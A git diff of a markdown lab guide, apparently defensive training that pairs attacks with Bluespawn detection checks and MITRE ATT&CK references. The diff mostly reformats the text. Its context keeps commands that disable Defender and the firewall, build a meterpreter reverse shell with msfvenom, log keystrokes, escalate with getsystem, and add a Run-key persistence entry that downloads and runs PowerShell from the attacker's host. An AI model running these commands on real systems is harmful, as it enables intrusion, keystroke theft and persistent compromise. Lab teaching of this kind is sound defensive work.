@@ -223,8 +223,8 @@ It should look like this:
 <img width="781" height="529" alt="image" src="https://github.com/user-attachments/assets/5932de02-775a-4e2a-b2e4-bd976a0dc2e3" />
 <hr>
 
-## Step 4: If You Have More Time
-
+## If You Have More Time
+### Disabling Defender & Windows Firewall
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
 <img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />
@@ -242,17 +242,14 @@ This will disable **Defender** for this session.
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
 Open **Command Prompt**
-
 <img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
-
 ```cmd
 netsh advfirewall set allprofiles state off
 ```
 
 Next, set a password for the Administrator account that you can remember
-
 ```bash
 net user Administrator password1234
 ```
@@ -260,9 +257,7 @@ net user Administrator password1234
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
 Let's continue by opening an **Ubuntu** terminal
-
 <img width="384" height="400" alt="image" src="https://github.com/user-attachments/assets/eb8beb6f-5bf9-4294-9b32-2306ad1c002e" />
-
 
 Become root:
 
@@ -278,7 +273,9 @@ ifconfig
 
 <img width="822" height="172" alt="image" src="https://github.com/user-attachments/assets/2b1c4aaf-cc64-4ecb-9763-84aada0c6a1c" />
 
-**REMEMBER: YOUR IP WILL BE DIFFERENT**
+> [!NOTE]
+>
+>**Remember Your IP Will Be Different!**
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
@@ -292,7 +289,9 @@ Run the following commands to start a simple backdoor and backdoor listener:
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 <img width="934" height="119" alt="image" src="https://github.com/user-attachments/assets/fd99899d-5962-4fcf-973e-18ab23db5ae2" />
+<hr>
 
+### Start The Metasploit Handler
 Now let's start the **Metasploit** Handler
 
 ```bash
@@ -313,7 +312,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST [Your Linux IP Address]
 ```
 
-Remember, **Your IP will be different!**
+> [!NOTE]
+>
+>**Remember Your IP Will Be Different!**
 
 ```bash
 exploit
@@ -350,7 +351,9 @@ TrustMe.exe
 
 Back at your Ubuntu terminal, you should have a metasploit session!
 <img width="940" height="466" alt="image" src="https://github.com/user-attachments/assets/8458c8b8-63fc-4749-9d74-730f205cd773" />
+<hr>
 
+### Keystroke Logs
 Now, let’s look at keystroke logging.
 
 To learn more about this check out MITRE:
@@ -360,17 +363,19 @@ https://attack.mitre.org/techniques/T1056/
 Here are some examples of threat groups, software, and campaigns associated with this technique:
 <img width="1385" height="756" alt="image" src="https://github.com/user-attachments/assets/4a0aafa0-dcf7-4c7b-a7d6-fdd8e01b3064" />
 
-Run commands
+Run the following commands in your `meterpreter` session:
 
-meterpreter > `keyscan_start`
+<pre>keyscan_start</pre>
 
 Go and type something on your Windows system.
 
-meterpreter > `keyscan_dump`
+<pre>keyscan_dump</pre>
 ![](attachments/Clipboard_2020-06-15-13-52-00.png)
 
 Go and check Bluespawn.  Did it detect it?
+<hr>
 
+### Registry Persistence
 Now, let’s play with registry persistence.
 
 To learn more about this check out MITRE:
@@ -381,7 +386,7 @@ Here are just some of the groups that use this technique:
 
 <img width="1386" height="489" alt="image" src="https://github.com/user-attachments/assets/d2446939-e59a-4c36-8a2f-46472a274834" />
 
-meterpreter > `shell`
+<pre>shell</pre>
 
 C:\Users\Administrator\Desktop> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://[Your Linux IP Address]:80/a'))\"" /f`
 
@@ -400,12 +405,9 @@ Here is al link to more info about this from MITRE:
 https://attack.mitre.org/techniques/T1543/
 
 Here are just some of the groups that use this technique:
-
 <img width="1405" height="484" alt="image" src="https://github.com/user-attachments/assets/744e008e-3c74-4f11-9e9a-1cac846f8481" />
 
-
-meterpreter >`getsystem`
-
+<pre>getsystem</pre>
 <img width="685" height="82" alt="image" src="https://github.com/user-attachments/assets/fffb4bd8-3cd5-4b9d-b4aa-bde75e26dca2" />
 
 <img width="1500" height="560" alt="image" src="https://github.com/user-attachments/assets/eb3352e1-2793-4ac3-9bc4-9a0f747c4a0f" />
